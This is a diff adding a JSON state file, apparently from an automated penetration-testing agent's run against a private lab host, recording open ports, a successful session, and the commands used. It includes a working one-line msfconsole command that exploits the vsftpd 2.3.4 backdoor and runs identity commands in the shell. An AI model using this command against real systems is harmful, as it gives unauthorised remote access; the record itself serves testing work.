@@ -1,0 +1,509 @@
+{
+  "schema_version": "1.0",
+  "session": {
+    "id": "20260530_162851_mvp_session",
+    "name_enterprise": null
+  },
+  "scope": {
+    "target_type": "host",
+    "target": "10.6.6.10",
+    "goal": "obtain_session"
+  },
+  "attacker": {
+    "hostname": null,
+    "interfaces": [],
+    "ipv4": [],
+    "default_gw": [],
+    "arp_neighbors": [],
+    "routes": []
+  },
+  "target": {
+    "networks": {
+      "10.6.6.10/24": {
+        "cidr": "10.6.6.10/24",
+        "host_discovery_done": false,
+        "hosts": {
+          "10.6.6.10": {
+            "ip": "10.6.6.10",
+            "hostname": null,
+            "alive": true,
+            "ports": {
+              "21": {
+                "port": 21,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "ftp",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [
+                  {
+                    "id": "1",
+                    "host": "10.6.6.10",
+                    "port": 21,
+                    "service": "ftp",
+                    "type": "shell",
+                    "tool": "msfconsole",
+                    "exploit": "vsftpd_234_backdoor",
+                    "user": null,
+                    "privilege": null,
+                    "closed": true,
+                    "hostname": null,
+                    "system": null,
+                    "evidence": {}
+                  }
+                ],
+                "attempts": [
+                  {
+                    "type": "exploit",
+                    "exploit": "vsftpd_234_backdoor",
+                    "source": "msfconsole",
+                    "success": true
+                  }
+                ],
+                "proto": "tcp"
+              },
+              "22": {
+                "port": 22,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "ssh",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [],
+                "attempts": [],
+                "proto": "tcp"
+              },
+              "23": {
+                "port": 23,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "telnet",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [],
+                "attempts": [],
+                "proto": "tcp"
+              },
+              "25": {
+                "port": 25,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "smtp",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [],
+                "attempts": [],
+                "proto": "tcp"
+              },
+              "80": {
+                "port": 80,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "http",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [],
+                "attempts": [],
+                "proto": "tcp"
+              },
+              "139": {
+                "port": 139,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "netbios-ssn",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [],
+                "attempts": [],
+                "proto": "tcp"
+              },
+              "445": {
+                "port": 445,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "microsoft-ds",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [],
+                "attempts": [],
+                "proto": "tcp"
+              },
+              "512": {
+                "port": 512,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "exec",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [],
+                "attempts": [],
+                "proto": "tcp"
+              },
+              "513": {
+                "port": 513,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "login",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [],
+                "attempts": [],
+                "proto": "tcp"
+              },
+              "514": {
+                "port": 514,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "shell",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [],
+                "attempts": [],
+                "proto": "tcp"
+              },
+              "1099": {
+                "port": 1099,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "rmiregistry",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [],
+                "attempts": [],
+                "proto": "tcp"
+              },
+              "1524": {
+                "port": 1524,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "ingreslock",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [],
+                "attempts": [],
+                "proto": "tcp"
+              },
+              "2121": {
+                "port": 2121,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "ccproxy-ftp",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [],
+                "attempts": [],
+                "proto": "tcp"
+              },
+              "3306": {
+                "port": 3306,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "mysql",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [],
+                "attempts": [],
+                "proto": "tcp"
+              },
+              "5432": {
+                "port": 5432,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "postgresql",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [],
+                "attempts": [],
+                "proto": "tcp"
+              },
+              "6667": {
+                "port": 6667,
+                "protocol": "tcp",
+                "state": "open",
+                "service": {
+                  "name": "irc",
+                  "product": null,
+                  "version": null,
+                  "banner": null
+                },
+                "candidate_vulns": [],
+                "credentials": [],
+                "sessions": [],
+                "attempts": [],
+                "proto": "tcp"
+              }
+            },
+            "findings": []
+          }
+        }
+      }
+    }
+  },
+  "findings": [
+    {
+      "title": "Session opened via vsftpd_234_backdoor",
+      "severity": "critical",
+      "host": "10.6.6.10",
+      "port": 21,
+      "service": "ftp",
+      "source": "msfconsole"
+    }
+  ],
+  "history": [
+    {
+      "type": "HOST_DISCOVERED",
+      "host": "10.6.6.10"
+    },
+    {
+      "type": "COMMAND_ERROR",
+      "action": "DISCOVER_HOSTS_ARP_LOCALNET",
+      "rc": 1,
+      "stderr": "pcap_activate: eth0: You don't have permission to perform this capture on that device\n(socket: Operation not permitted)\n"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 21,
+      "proto": "tcp",
+      "service": "ftp"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 22,
+      "proto": "tcp",
+      "service": "ssh"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 23,
+      "proto": "tcp",
+      "service": "telnet"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 25,
+      "proto": "tcp",
+      "service": "smtp"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 80,
+      "proto": "tcp",
+      "service": "http"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 139,
+      "proto": "tcp",
+      "service": "netbios-ssn"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 445,
+      "proto": "tcp",
+      "service": "microsoft-ds"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 512,
+      "proto": "tcp",
+      "service": "exec"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 513,
+      "proto": "tcp",
+      "service": "login"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 514,
+      "proto": "tcp",
+      "service": "shell"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 1099,
+      "proto": "tcp",
+      "service": "rmiregistry"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 1524,
+      "proto": "tcp",
+      "service": "ingreslock"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 2121,
+      "proto": "tcp",
+      "service": "ccproxy-ftp"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 3306,
+      "proto": "tcp",
+      "service": "mysql"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 5432,
+      "proto": "tcp",
+      "service": "postgresql"
+    },
+    {
+      "type": "PORT_OPEN",
+      "host": "10.6.6.10",
+      "port": 6667,
+      "proto": "tcp",
+      "service": "irc"
+    },
+    {
+      "type": "EXPLOIT_ATTEMPTED",
+      "host": "10.6.6.10",
+      "port": 21,
+      "exploit": "vsftpd_234_backdoor",
+      "source": "msfconsole"
+    },
+    {
+      "type": "SESSION_OPENED",
+      "host": "10.6.6.10",
+      "port": 21,
+      "session_id": "1",
+      "exploit": "vsftpd_234_backdoor",
+      "source": "msfconsole"
+    },
+    {
+      "type": "SESSION_CLOSED",
+      "host": "10.6.6.10",
+      "port": 21,
+      "session_id": "1",
+      "source": "msfconsole"
+    }
+  ],
+  "stats": {
+    "steps": 0,
+    "networks": 1,
+    "hosts": 1,
+    "ports": 16,
+    "services": 16,
+    "vulns": 0,
+    "credentials": 0,
+    "sessions": 1,
+    "exploits_attempted": 1,
+    "exploits_failed": 0
+  },
+  "last": {
+    "step_idx": 0,
+    "action_id": null,
+    "action_name": null,
+    "rc": null,
+    "success": null,
+    "event_types": null
+  },
+  "focus": {
+    "level": "global",
+    "host": "",
+    "service": ""
+  },
+  "commands": [
+    "nmap -sn 10.6.6.10",
+    "arp-scan --localnet",
+    "nmap --top-ports 1000 --open -T3 10.6.6.10",
+    "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.6.6.10; set RPORT 21; exploit -z; sleep 8; sessions -l; sessions -c \"whoami && id && hostname && uname -a\" -i 1; sleep 2; sessions -K; exit -y'"
+  ],
+  "step_idx": 3,
+  "last_action_id": 601,
+  "last_action_name": "MSF_EXPLOIT_VSFTPD_234_BACKDOOR",
+  "last_rc": 0,
+  "last_event_type": "EXPLOIT_ATTEMPTED"
+}
